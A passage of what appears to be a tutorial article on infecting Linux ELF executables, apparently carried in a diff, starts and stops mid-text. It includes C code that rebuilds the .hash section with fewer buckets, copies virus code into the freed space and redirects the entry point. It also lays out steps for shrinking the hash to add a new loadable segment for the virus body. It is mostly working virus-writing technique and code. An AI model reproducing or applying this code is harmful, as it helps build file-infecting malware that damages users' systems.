+<span style="color: #993333;">void</span> build_hash<span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>hash<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> nbuckets<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> nchains<span style="color: #339933;">,</span> Elf32_Sym <span style="color: #339933;">*</span>sym<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>str<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> &nbsp; &nbsp; &nbsp; &nbsp;i<span style="color: #339933;">,</span> h<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>buckets<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>chains<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; buckets <span style="color: #339933;">=</span> hash <span style="color: #339933;">+</span> <span style="color: #0000dd;">2</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; chains &nbsp;<span style="color: #339933;">=</span> buckets <span style="color: #339933;">+</span> nbuckets<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> nbuckets<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> nchains<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> nchains<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; h <span style="color: #339933;">=</span> elf_hash<span style="color: black;">&#40;</span>str <span style="color: #339933;">+</span> sym<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">st_name</span><span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> nbuckets<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>buckets<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buckets<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> i<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; h <span style="color: #339933;">=</span> buckets<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>chains<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span> <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; h <span style="color: #339933;">=</span> chains<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; chains<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> i<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Don't forget to make <code>memset(hash, 0, size_of_hash_section);</code>!</p>
+<p>Minimal, maximal and average value of nbuckets for files from /bin:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">$ <span style="color: #000000; font-weight: bold;">for</span> i <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">/</span>bin<span style="color: #000000; font-weight: bold;">/*</span>; <span style="color: #000000; font-weight: bold;">do</span> .<span style="color: #000000; font-weight: bold;">/</span>hstat <span style="color: #007800;">$i</span>; <span style="color: #000000; font-weight: bold;">done</span><span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">awk</span> <span style="color: #ff0000;">'BEGIN{min=10000;max=0;n=0;s=0;}<br/>
+/^[0-9]/{if($1&lt;min)min=$1;if($1&gt;max)max=$1;s+=$1;n++}END{print min,max,s/n}'</span><br/>
+<span style="color: #000000;">3</span> <span style="color: #000000;">1031</span> <span style="color: #000000;">87.1304</span><br/>
+&nbsp;</div>
+<p>Well, what is there to do</p>
+<ul>
+<li>Make sure that hash is large enough (nbuckets - (virus_size + 3) / 4 > 0)</li>
+<li>Decrease nbuckets by the length of virus in dwords</li>
+<li>Build new hash</li>
+<li>Write the virus code at the end of section</li>
+</ul>
+<p>By the way, the sh_link field can be used to find the needed sections:</p>
+<pre class="source">
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
+  [ 1] .interp           PROGBITS        08047134 000134 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            08047148 000148 000020 00   A  0   0  4
+  [ 3] .dynstr           STRTAB          08047168 000168 00030a 00   A  0   0  1 &lt;----+
+  [ 4] .gnu.liblist      GNU_LIBLIST     08047474 000474 00003c 14   A  3   0  4      |
+  [ 5] .gnu.conflict     RELA            080474b0 0004b0 00012c 0c   A  7   0  4      |
+  [ 6] .hash             HASH            08048168 001168 00023c 04   A  7   0  4 ---+ |
+  [ 7] .dynsym           DYNSYM          080483a4 0013a4 0004a0 10   A  3   1  4 &lt;--+ |
+                                                                        +-------------+
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .		
+</pre>
+<p>As thus:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Sym &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>sym <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">*</span>str <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FOR_EACH_SHDR<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>shdr<span style="color: #339933;">-&gt;</span>sh_type <span style="color: #339933;">==</span> SHT_HASH<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sh <span style="color: #339933;">=</span> shdr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/assert.html"><span style="color: #000066;">assert</span></a><span style="color: black;">&#40;</span>sh <span style="color: #339933;">!=</span> NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; shdr &nbsp; &nbsp;<span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> ehdr<span style="color: #339933;">-&gt;</span>e_shoff<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; u &nbsp; &nbsp; &nbsp; <span style="color: #339933;">=</span> sh<span style="color: #339933;">-&gt;</span>sh_link<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; sym &nbsp; &nbsp; <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Sym<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> shdr<span style="color: black;">&#91;</span>u<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_offset</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; u &nbsp; &nbsp; &nbsp; <span style="color: #339933;">=</span> shdr<span style="color: black;">&#91;</span>u<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_link</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; str &nbsp; &nbsp; <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> shdr<span style="color: black;">&#91;</span>u<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_offset</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>hash <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> sh<span style="color: #339933;">-&gt;</span>sh_offset<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> nb <span style="color: #339933;">=</span> hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> nc <span style="color: #339933;">=</span> hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/assert.html"><span style="color: #000066;">assert</span></a><span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span>nb <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span>code_len <span style="color: #339933;">+</span> <span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span><span style="color: #339933;">/</span><span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&gt;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memset.html"><span style="color: #000066;">memset</span></a><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> sh<span style="color: #339933;">-&gt;</span>sh_offset<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span>nb <span style="color: #339933;">+</span> nc <span style="color: #339933;">+</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; nb <span style="color: #339933;">-=</span> <span style="color: black;">&#40;</span>code_len <span style="color: #339933;">+</span> <span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span><span style="color: #339933;">/</span><span style="color: #0000dd;">4</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; build_hash<span style="color: black;">&#40;</span>hash<span style="color: #339933;">,</span> nb<span style="color: #339933;">,</span> nc<span style="color: #339933;">,</span> sym<span style="color: #339933;">,</span> str<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; t <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #0000dd;">2</span> <span style="color: #339933;">+</span> nb <span style="color: #339933;">+</span> nc<span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #0000dd;">4</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> sh<span style="color: #339933;">-&gt;</span>sh_offset <span style="color: #339933;">+</span> t<span style="color: #339933;">,</span> code<span style="color: #339933;">,</span> code_len<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ehdr<span style="color: #339933;">-&gt;</span>e_entry <span style="color: #339933;">=</span> sh<span style="color: #339933;">-&gt;</span>sh_addr <span style="color: #339933;">+</span> t<span style="color: #339933;">;</span><br/>
+&nbsp;</div>
+<p>Let's look how the hash table changed:</p>
+<pre class="source"><strong>BEFORE</strong>
+Name 'sigfillset', hash 0d06a614 buckets[12]=1
+ ... 1 (sigfillset)
+-> 1
+Name 'getgrnam', hash 0cae92ad buckets[61]=57
+ ... 57 (free)
+ ... 48 (lookup_wchan)
+ ... 30 (escape_command)
+ ... 2 (getgrnam)
+-> 2
+<em>skipped</em>
+Name '__gmon_start__', hash 0f4d007f buckets[35]=72
+ ... 72 (__gmon_start__)
+-> 72
+Name 'strcpy', hash 07ab8a79 buckets[5]=73
+ ... 73 (strcpy)
+-> 73
+<strong>AFTER</strong>
+27 hash buckets, 74 chains
+Name 'sigfillset', hash 0d06a614 buckets[1]=1
+ ... 1 (sigfillset)
+-> 1
+Name 'getgrnam', hash 0cae92ad buckets[7]=2
+ ... 2 (getgrnam)
+-> 2
+<em>skipped</em>
+Name '__gmon_start__', hash 0f4d007f buckets[6]=27
+ ... 27 (getpagesize)
+ ... 35 (readtask)
+ ... 67 (fwrite)
+ ... 72 (__gmon_start__)
+-> 72
+Name 'strcpy', hash 07ab8a79 buckets[23]=6
+ ... 6 (strchr)
+ ... 18 (signal_number_to_name)
+ ... 59 (get_pid_digits)
+ ... 73 (strcpy)
+-> 73
+</pre>
+<h2><a name="c4"></a>D. Shrink hash and add the new segment</h2>
+<p>I hope, that everybody familiar with the method of ELF file infection, that out of mere freak is called "additional" code segment [3], although in point of fact due to impossibility to add new entry to the segment table (Program Header Table, PHT), the entry of type PT_NOTE replaced with PT_LOAD. We already knew how to find a bit of space in the code segment (where the PHT resides), and nothing prevent us from increasing the table size, and really <em>add</em> a segment without detracting anything in any way.</p>
+<p>What is there to do:</p>
+<ul>
+<li>Look through the section table and memorize all needed pointers</li>
+<li>Build new hash table with nbuckets lessen by 8 elements (this give us 32 bytes (<code>sizeof(Elf32_Phdr)</code>) in code segment)</li>
+<li>Shift all sections, starting from .hash and till and including the <em>first</em> (not zero) by 32 bytes (increase sh_offset and sh_addr in SHT)</li>
+<li>If the address of the segment in PHT is equal to the address of section, fix PHT (these are PT_INTERP/.interp, PT_NOTE / .note.ABI-tag)</li>
+<li>If the address of pointer in the dynamic array is equal to the address of section, fix it also (it holds for DT_HASH/.hash, DT_SYMTAB/.dynsym etc)</li>
+<li>Increase the number of PHT entries (<code>ehdr->e_phnum++</code>) and the size of PT_PHDR segment in file and in memory (<code>ph->p_filesz += 32; ph->p_memsz+=32</code>)</li>
+<li>Separate PHT after the last PT_LOAD and add another one</li>
+<li>Father on, do the same as in the case of PT_NOTE replacement
+<ul>
+<li>Select the address for the new segment (in our case - minimal address - 2 pages)</li>
+<li>Write the virus body to the end of file (Linux.Hasher.d does this) (or after the last loadable segment like in the example below)</li>
+<li>Fill the PHT entry</li>
+</ul></li>
+</ul>
+<p>Like so:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Dyn &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>dyn <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Sym &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>sym <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">*</span>str <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hn<span style="color: #339933;">,</span> dynsz<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FOR_EACH_SHDR <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>shdr<span style="color: #339933;">-&gt;</span>sh_type <span style="color: #339933;">==</span> SHT_DYNAMIC<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dyn <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Dyn<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> shdr<span style="color: #339933;">-&gt;</span>sh_offset<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dynsz <span style="color: #339933;">=</span> shdr<span style="color: #339933;">-&gt;</span>sh_size <span style="color: #339933;">/</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Dyn<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>shdr<span style="color: #339933;">-&gt;</span>sh_type <span style="color: #339933;">==</span> SHT_HASH<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sh <span style="color: #339933;">=</span> shdr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hn <span style="color: #339933;">=</span> i<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>shdr<span style="color: #339933;">-&gt;</span>sh_type <span style="color: #339933;">==</span> SHT_DYNSYM<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sym <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Sym<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> shdr<span style="color: #339933;">-&gt;</span>sh_offset<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; str <span style="color: #339933;">=</span> m <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> ehdr<span style="color: #339933;">-&gt;</span>e_shoff<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#91;</span>shdr<span style="color: #339933;">-&gt;</span>sh_link<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_offset</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/assert.html"><span style="color: #000066;">assert</span></a><span style="color: black;">&#40;</span>sh <span style="color: #339933;">!=</span> NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/assert.html"><span style="color: #000066;">assert</span></a><span style="color: black;">&#40;</span>dyn <span style="color: #339933;">!=</span> NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>hash <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> sh<span style="color: #339933;">-&gt;</span>sh_offset<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/assert.html"><span style="color: #000066;">assert</span></a><span style="color: black;">&#40;</span>hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">&gt;</span> <span style="color: #0000dd;">9</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* reduce hash size */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> nb<span style="color: #339933;">,</span> nc<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; nb <span style="color: #339933;">=</span> hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; nc <span style="color: #339933;">=</span> hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memset.html"><span style="color: #000066;">memset</span></a><span style="color: black;">&#40;</span>hash<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #0000dd;">2</span> <span style="color: #339933;">+</span> nb <span style="color: #339933;">+</span> nc<span style="color: black;">&#41;</span> <span style="color: #339933;">*</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; nb <span style="color: #339933;">-=</span> <span style="color: #0000dd;">8</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; build_hash<span style="color: black;">&#40;</span>hash<span style="color: #339933;">,</span> nb<span style="color: #339933;">,</span> nc<span style="color: #339933;">,</span> sym<span style="color: #339933;">,</span> str<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; sh<span style="color: #339933;">-&gt;</span>sh_size <span style="color: #339933;">-=</span> <span style="color: #0000dd;">32</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* shift sections */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> j<span style="color: #339933;">,</span> k<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>k <span style="color: #339933;">=</span> hn<span style="color: #339933;">,</span> shdr <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> ehdr<span style="color: #339933;">-&gt;</span>e_shoff<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> k <span style="color: #339933;">&gt;</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> k<span style="color: #339933;">--</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memmove.html"><span style="color: #000066;">memmove</span></a><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> shdr<span style="color: black;">&#91;</span>k<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_offset</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">32</span><span style="color: #339933;">,</span> m <span style="color: #339933;">+</span> shdr<span style="color: black;">&#91;</span>k<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_offset</span><span style="color: #339933;">,</span> shdr<span style="color: black;">&#91;</span>k<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* fix PT_INTERP, PT_NOTE ... */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FOR_EACH_PHDR<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>phdr<span style="color: #339933;">-&gt;</span>p_vaddr <span style="color: #339933;">==</span> shdr<span style="color: black;">&#91;</span>k<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_addr</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; phdr<span style="color: #339933;">-&gt;</span>p_vaddr <span style="color: #339933;">+=</span> <span style="color: #0000dd;">32</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; phdr<span style="color: #339933;">-&gt;</span>p_paddr <span style="color: #339933;">+=</span> <span style="color: #0000dd;">32</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; phdr<span style="color: #339933;">-&gt;</span>p_offset <span style="color: #339933;">+=</span> <span style="color: #0000dd;">32</span><span style="color: #339933;">;</span><br/>
